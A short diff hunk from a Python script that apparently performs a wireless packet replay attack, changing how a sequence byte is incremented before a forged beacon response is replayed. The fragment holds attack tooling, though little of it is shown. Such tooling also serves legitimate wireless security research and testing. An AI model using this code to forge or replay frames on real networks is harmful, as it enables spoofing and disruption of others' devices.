@@ -128,7 +128,7 @@ if __name__ == '__main__':
         kb.sniffer_off()
 
         # Update timestamp
-        beacon_response_bytes[2] = (br_seq_num+1) % 256
+        beacon_response_bytes[2] = (beacon_response_bytes[2]+1) % 256
 
         # Send forged beacon response
         print('7. Replaying beacon response.')
